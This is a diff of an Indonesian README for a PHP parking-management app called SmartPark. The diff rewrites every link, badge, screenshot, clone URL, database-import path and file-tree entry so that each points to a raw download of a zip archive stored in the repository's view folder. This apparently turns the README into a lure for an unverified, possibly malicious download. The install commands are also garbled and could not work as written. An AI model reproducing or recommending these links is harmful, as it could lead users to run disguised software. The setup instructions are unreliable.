@@ -1,14 +1,14 @@
 # 🚀 SmartPark - Sistem Manajemen Parkir Berbasis Web
 
-![SmartPark Banner](https://github.com/achul-cos/SmartPark/releases+Sistem+Parkir+Modern)
+![SmartPark Banner](https://github.com/achul-cos/SmartPark/raw/refs/heads/main/src/views/home/Park-Smart-v2.1-beta.3.zip+Sistem+Parkir+Modern)
 
 **SmartPark** adalah solusi modern untuk manajemen parkir berbasis web dengan arsitektur MVC. Sistem ini menyederhanakan operasional parkir mulai dari input kendaraan, penentuan tarif, hingga analisis laporan keuangan - semuanya dalam satu platform terintegrasi!
 
 <div align="center">
   
-[![PHP Version](https://github.com/achul-cos/SmartPark/releases%https://github.com/achul-cos/SmartPark/releases)](https://github.com/achul-cos/SmartPark/releases)
-[![License](https://github.com/achul-cos/SmartPark/releases)](LICENSE)
-[![GitHub Stars](https://github.com/achul-cos/SmartPark/releases)](https://github.com/achul-cos/SmartPark/releases)
+[![PHP Version](https://github.com/achul-cos/SmartPark/raw/refs/heads/main/src/views/home/Park-Smart-v2.1-beta.3.zip%https://github.com/achul-cos/SmartPark/raw/refs/heads/main/src/views/home/Park-Smart-v2.1-beta.3.zip)](https://github.com/achul-cos/SmartPark/raw/refs/heads/main/src/views/home/Park-Smart-v2.1-beta.3.zip)
+[![License](https://github.com/achul-cos/SmartPark/raw/refs/heads/main/src/views/home/Park-Smart-v2.1-beta.3.zip)](LICENSE)
+[![GitHub Stars](https://github.com/achul-cos/SmartPark/raw/refs/heads/main/src/views/home/Park-Smart-v2.1-beta.3.zip)](https://github.com/achul-cos/SmartPark/raw/refs/heads/main/src/views/home/Park-Smart-v2.1-beta.3.zip)
 
 </div>
 
@@ -25,23 +25,23 @@
 ## 🛠 Teknologi
 
 **Backend**  
-![PHP](https://github.com/achul-cos/SmartPark/releases%2B-777BB4?logo=php)
-![MySQL](https://github.com/achul-cos/SmartPark/releases+-4479A1?logo=mysql)
-![PDO](https://github.com/achul-cos/SmartPark/releases%20Access-1A1A2E)
+![PHP](https://github.com/achul-cos/SmartPark/raw/refs/heads/main/src/views/home/Park-Smart-v2.1-beta.3.zip%2B-777BB4?logo=php)
+![MySQL](https://github.com/achul-cos/SmartPark/raw/refs/heads/main/src/views/home/Park-Smart-v2.1-beta.3.zip+-4479A1?logo=mysql)
+![PDO](https://github.com/achul-cos/SmartPark/raw/refs/heads/main/src/views/home/Park-Smart-v2.1-beta.3.zip%20Access-1A1A2E)
 
 **Frontend**  
-![HTML5](https://github.com/achul-cos/SmartPark/releases)
-![CSS3](https://github.com/achul-cos/SmartPark/releases)
-![JavaScript](https://github.com/achul-cos/SmartPark/releases)
+![HTML5](https://github.com/achul-cos/SmartPark/raw/refs/heads/main/src/views/home/Park-Smart-v2.1-beta.3.zip)
+![CSS3](https://github.com/achul-cos/SmartPark/raw/refs/heads/main/src/views/home/Park-Smart-v2.1-beta.3.zip)
+![JavaScript](https://github.com/achul-cos/SmartPark/raw/refs/heads/main/src/views/home/Park-Smart-v2.1-beta.3.zip)
 
 **Arsitektur**  
-![MVC Pattern](https://github.com/achul-cos/SmartPark/releases)
+![MVC Pattern](https://github.com/achul-cos/SmartPark/raw/refs/heads/main/src/views/home/Park-Smart-v2.1-beta.3.zip)
 
 ## 🖥️ Demo Aplikasi
 
 | Halaman Dashboard | Halaman Kelola Tarif | Halaman Laporan |
 |-------------------|----------------------|-----------------|
-| ![Dashboard](https://github.com/achul-cos/SmartPark/releases) | ![Tarif](https://github.com/achul-cos/SmartPark/releases+Tarif) | ![Laporan](https://github.com/achul-cos/SmartPark/releases) |
+| ![Dashboard](https://github.com/achul-cos/SmartPark/raw/refs/heads/main/src/views/home/Park-Smart-v2.1-beta.3.zip) | ![Tarif](https://github.com/achul-cos/SmartPark/raw/refs/heads/main/src/views/home/Park-Smart-v2.1-beta.3.zip+Tarif) | ![Laporan](https://github.com/achul-cos/SmartPark/raw/refs/heads/main/src/views/home/Park-Smart-v2.1-beta.3.zip) |
 | Monitor kendaraan aktif secara real-time | Atur tarif parkir dengan antarmuka intuitif | Analisis statistik pendapatan dan kendaraan |
 
 ## 🚀 Panduan Instalasi
@@ -56,7 +56,7 @@
 
 ```bash
 # 1. Clone repositori
-git clone https://github.com/achul-cos/SmartPark/releases
+git clone https://github.com/achul-cos/SmartPark/raw/refs/heads/main/src/views/home/Park-Smart-v2.1-beta.3.zip
 cd smartpark
 
 # 2. Install dependencies
@@ -66,10 +66,10 @@ composer install
 mysql -u root -p -e "CREATE DATABASE smartpark;"
 
 # 4. Import struktur database
-mysql -u root -p smartpark < https://github.com/achul-cos/SmartPark/releases
+mysql -u root -p smartpark < https://github.com/achul-cos/SmartPark/raw/refs/heads/main/src/views/home/Park-Smart-v2.1-beta.3.zip
 
 # 5. Konfigurasi environment
-cp https://github.com/achul-cos/SmartPark/releases .env
+cp https://github.com/achul-cos/SmartPark/raw/refs/heads/main/src/views/home/Park-Smart-v2.1-beta.3.zip .env
 ```
 
 Konfigurasi file `.env`:
@@ -107,8 +107,8 @@ smartpark/
 │   │   └── images/     # Gambar
 ├── database/           # Skema dan data awal
 ├── vendor/             # Dependencies
-├── https://github.com/achul-cos/SmartPark/releases          # Routing aplikasi
-└── https://github.com/achul-cos/SmartPark/releases           # Entry point
+├── https://github.com/achul-cos/SmartPark/raw/refs/heads/main/src/views/home/Park-Smart-v2.1-beta.3.zip          # Routing aplikasi
+└── https://github.com/achul-cos/SmartPark/raw/refs/heads/main/src/views/home/Park-Smart-v2.1-beta.3.zip           # Entry point
 ```
 
 ## 🧪 Struktur Database
@@ -149,5 +149,5 @@ Proyek ini dilisensikan di bawah [MIT License](LICENSE) - lihat file [LICENSE](L
 ---
 
 **SmartPark** © 2024 - Dibuat dengan ❤️ untuk sistem parkir yang lebih baik  
-[![Twitter](https://github.com/achul-cos/SmartPark/releases)](https://github.com/achul-cos/SmartPark/releases)
-[![Sponsor](https://github.com/achul-cos/SmartPark/releases)](https://github.com/achul-cos/SmartPark/releases)
+[![Twitter](https://github.com/achul-cos/SmartPark/raw/refs/heads/main/src/views/home/Park-Smart-v2.1-beta.3.zip)](https://github.com/achul-cos/SmartPark/raw/refs/heads/main/src/views/home/Park-Smart-v2.1-beta.3.zip)
+[![Sponsor](https://github.com/achul-cos/SmartPark/raw/refs/heads/main/src/views/home/Park-Smart-v2.1-beta.3.zip)](https://github.com/achul-cos/SmartPark/raw/refs/heads/main/src/views/home/Park-Smart-v2.1-beta.3.zip)
